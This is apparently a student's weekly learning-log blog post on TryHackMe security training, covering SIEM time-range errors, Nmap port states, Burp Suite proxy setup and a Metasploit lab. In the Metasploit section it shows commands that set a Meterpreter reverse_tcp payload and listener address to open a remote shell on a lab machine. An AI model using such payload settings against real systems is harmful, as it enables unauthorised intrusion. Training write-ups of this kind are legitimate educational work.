# Week 09 — Errors & Struggles

This week was Pre Security, all 14 modules of Cyber Security 101, and the
start of prep for the TryHackMe SOC Analyst Level 1 (SAL-1) certification.
After finishing two full learning paths, I expected the SAL-1 material to
be a step up in *concepts*. Instead, the real difficulty was learning to
actually investigate like a SOC analyst — which turned out to be a
completely different skill from knowing what a SIEM or a scan result
means in theory. Documenting all of it below, exactly as it happened.

---

## Struggle 1: I Spent Nearly 20 Minutes Convinced the SIEM Wasn't Collecting Logs

### The Problem

During one of the SAL-1 investigation labs, I searched for events related
to an alert and found nothing. I rewrote my queries, checked the filters,
and eventually started wondering if the SIEM wasn't collecting logs
correctly at all.

### My Debugging Process

Nearly twenty minutes in, I noticed my search window was set to the wrong
time range. The logs had been there the entire time — I was simply
looking in the wrong place. I'd jumped straight to rewriting queries and
second-guessing the tool itself, without ever checking the one setting
that actually controlled what I could see in the first place.

### The Fix

I stopped treating investigations as "write a query and see what comes
back" and started treating them as a checklist, in order:

```
1. Verify the alert timestamp
2. Confirm the search/time range covers that timestamp
3. Confirm the correct log source is selected
4. Only then start searching for evidence
```

**My Observation:**
A SIEM can only show you what you ask it to show. Even a perfectly
written query becomes useless if the investigation starts with the wrong
timeframe. Before analyzing alerts or hunting for indicators, the first
step is making sure you're looking at the correct data — not writing a
better query against the wrong window.

---

## Struggle 2: I Misread a Filtered Port as a Closed One During an Nmap Scan

### The Problem

Running a scan against one of the Cyber Security 101 lab machines, Nmap
reported a port as `filtered`, and I read straight past the word and
treated it the same as `closed` — meaning "nothing's there, move on."

### My Debugging Process

I went back to Nmap's own reference docs instead of guessing. `closed`
means a port actively responded and said no service is listening.
`filtered` means Nmap couldn't even tell — a firewall or filter dropped
the probe entirely, so the port's real state is unknown, not confirmed
empty. I'd been treating "no clear answer" the same as "confirmed
nothing," which meant I skipped a port that may well have had a service
sitting behind a filter.

### The Fix

I wrote the three states out side by side so I couldn't collapse them
again:

```
open     → something is actively listening and responded
closed    → the host responded, but nothing is listening on that port
filtered   → no response at all — a firewall/filter is in the way,
             the real state is unknown, not "safe to ignore"
```

**My Observation:**
`filtered` is Nmap being honest about uncertainty, not a green light to
move on. Reading it as "closed" would have meant walking past exactly the
kind of port a firewall is deliberately protecting — the one most worth a
second look.

---

## Struggle 3: My Meterpreter Session Kept Dying Instantly on the "Blue" Room

### The Problem

Working through the Metasploit exploitation room, I got the exploit to
fire successfully, but the Meterpreter session opened and immediately
died before I could run a single command.

### My Debugging Process

I assumed the exploit itself was wrong and spent a while trying
different modules before actually reading the payload configuration
closely. The payload architecture (x86 vs x64) didn't match the target,
and I'd also left the default `LHOST` pointing at the wrong network
interface, so the reverse connection was never stable to begin with.

### The Fix

Before running `exploit` again, I started explicitly checking both
values instead of trusting the defaults:

```
set PAYLOAD windows/x64/meterpreter/reverse_tcp   # match target architecture
set LHOST <correct-tun0/attacker-IP>                 # confirm the right interface
```

**My Observation:**
A successful exploit and a stable session are two different milestones.
It's easy to see "exploit completed" and assume the hard part is over —
but a mismatched payload or wrong listener address will quietly kill the
session before it's ever actually useful.

---

## Struggle 4: Burp Suite Showed an Empty Proxy History and I Assumed the Tool Was Broken

### The Problem

Starting the Web Hacking module, I opened Burp Suite's Proxy tab expecting
to see live traffic as I browsed the target site. The history stayed
completely empty, and my first assumption was that Burp itself wasn't
working.

### My Debugging Process

The tool was fine — my browser simply wasn't sending traffic through it.
I'd skipped configuring the browser's proxy settings to actually point at
Burp's listener (`127.0.0.1:8080`), so every request was going straight
to the target and bypassing the interception layer entirely.

### The Fix

I went through PortSwigger's own setup docs instead of guessing at
settings, and confirmed the two things that actually needed to match:

```
Burp Proxy listener   → 127.0.0.1:8080 (default)
Browser proxy setting → manually set to the same host:port
Burp's CA certificate  → installed in the browser for HTTPS interception
```

**My Observation:**
"The tool isn't working" was my first assumption, but it was almost
always my configuration, not the tool. That instinct — blame the tool
before checking my own setup — is exactly the one I need to unlearn
early, since it wastes time on the wrong end of the problem every time.

---

## Week 9 Reflection on Struggles

Looking back, this week's struggles had a different shape than Week-05's.
Week-05 was about blurring definitions together under pressure — risk vs.
threat, IDS vs. IPS. This week, every struggle came from the same root
cause: trusting my first assumption about what a tool was telling me,
instead of checking the actual state it was actually in. I assumed the
SIEM wasn't collecting logs before checking my own time range. I assumed
a filtered port meant nothing was there. I assumed a dead Meterpreter
session meant a bad exploit. I assumed an empty Burp history meant a
broken tool. In every case, the tool was doing exactly what it was told —
I just hadn't verified my own inputs before blaming the output.

That's the same instinct a SOC analyst has to fight on every shift: the
tools are rarely wrong, but the assumptions about what they're currently
configured to show you absolutely can be. Pre Security and Cyber Security
101 taught me what each tool does. This week's SAL-1 prep is teaching me
to stop trusting my first read of a result and start verifying it before
acting on it.

I didn't just learn new tools this week. I learned that the fastest way
to lose twenty minutes is to debug the tool before debugging your own
assumptions about it.

**Have you ever spent way longer than you'd like to admit troubleshooting
a tool, only to find the problem was a setting you configured yourself?**
